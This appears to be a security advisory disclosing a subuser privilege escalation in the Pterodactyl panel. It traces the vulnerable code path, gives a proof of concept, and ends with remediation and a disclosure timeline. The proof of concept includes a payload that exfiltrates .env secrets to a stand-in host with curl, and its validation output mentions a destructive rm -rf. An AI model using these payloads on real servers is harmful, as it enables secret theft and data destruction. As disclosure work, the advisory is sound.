https://github.com/pterodactyl/panel/

## Finding: Subuser privilege escalation via scheduled tasks (missing task-action authorization) to console RCE / power / backup

### Summary

A server subuser granted only the `schedule.*` permissions can create and run a scheduled task whose action is `command`, `power`, or `backup` with an arbitrary payload, gaining arbitrary game-server console command execution, power control, and backup creation, none of which they hold the dedicated permission for. Task creation and execution require only `schedule.update`, and the job that dispatches the action to Wings performs no actor-permission re-check. Confirmed against `ServerPolicy`, `Permission` model, and `StoreTaskRequest` in a booted Laravel kernel: a `schedule.update`-only subuser was authorized to persist a `command` task while failing the `control.console` check.

### Details

Source: authenticated subuser requests to the client API. Sinks/flow:

- `app/Http/Requests/Api/Client/Servers/Schedules/StoreTaskRequest.php`: `permission()` returns only `Permission::ACTION_SCHEDULE_UPDATE`; `rules()` allows `action` in `command,power,backup` with a free-form string `payload` (class comment: "There are no task specific permissions.").
- `app/Http/Controllers/Api/Client/Servers/Schedules/ScheduleTaskController.php` `store()`: persists the task; only special-cases `backup` when `backup_limit===0`, never checks the actor's `control.*`/`backup.*` permissions.
- `app/Http/Requests/Api/Client/Servers/Schedules/TriggerScheduleRequest.php`: `POST /schedules/{id}/execute` also requires only `schedule.update`.
- `app/Jobs/Schedule/RunTaskJob.php:61-72`: `switch ($this->task->action)` sends `ACTION_COMMAND` -> `$commandRepository->send($payload)`, `ACTION_POWER` -> `$powerRepository->send($payload)`, `ACTION_BACKUP` -> backup service, to Wings with no actor-permission re-check (full server authority).
- Gate: `app/Policies/ServerPolicy.php` `before()` -> `checkPermission()` does `in_array($permission, $subuser->permissions)`, so a `schedule.update`-only subuser passes `schedule.update` and fails `control.console`.

The boundary crossed is cross-permission privilege escalation between subusers sharing a server: a low-trust subuser scoped by the owner to schedules only gains console RCE / power / backup capability they were explicitly not granted, defeating Pterodactyl's documented per-subuser permission model.

### PoC

```
POST /api/client/servers/{server}/schedules/{schedule}/tasks
{ "action":"command", "payload":"curl http://evil/$(cat /home/container/.env|base64)" }
# accepted with only schedule.update; then:
POST /api/client/servers/{server}/schedules/{schedule}/execute
# RunTaskJob sends the command to Wings with full server authority
```

Validated by installing deps (`composer install`), booting the Laravel kernel via `bootstrap/app.php`, and instantiating the actual shipped `ServerPolicy`, `Permission`, and `StoreTaskRequest` with an in-memory subuser whose permissions are the four `schedule.*` + `websocket.connect`, then running the `Gate` and `Validator::make($payload, StoreTaskRequest::rules())` (no vulnerable logic reimplemented):

```
Gate->check(schedule.update) = true     (StoreTaskRequest authorizes the request)
Gate->check(control.console) = false ; control.start/stop = false ; backup.create = false
StoreTaskRequest::rules() accepts {action:command, payload:"curl ...$(cat /home/container/.env|base64)...; rm -rf ..."} = true
=> PRIVILEGE ESCALATION CONFIRMED
```

`RunTaskJob` dispatches the command to the daemon with no further permission check, completing the chain.

### Impact

Any subuser with schedule access (a common delegation) escalates to arbitrary console command execution (RCE within the game-server container, including reading `/home/container/.env` secrets and destructive commands), power control (start/stop/kill), and backup creation, on a server where the owner granted them only scheduling. Confidentiality, integrity, and availability impact on the server.

### Remediation

In `ScheduleTaskController::store()`/`update()` (or `StoreTaskRequest`), require the action-specific permission in addition to `schedule.update`: map `action=command` -> `control.console`, `action=power` -> `control.start`/`control.stop`/`control.restart`, `action=backup` -> `backup.create`, and reject the task if the requesting user lacks it (`$request->user()->can(...)`). The check must be at task creation/update time, since `RunTaskJob` runs detached with no acting user.


Affected version: commit 98079a0

### Disclosure
 - 13 June 2026 - reported via https://github.com/pterodactyl/panel/security/advisories/GHSA-phv3-9xhv-wjmw
 - July - created https://github.com/pterodactyl/panel/issues/5685
 - August - https://github.com/pterodactyl/panel/issues/5685 was deleted
 - 5 September 2026 - GHSA no response; disclosed
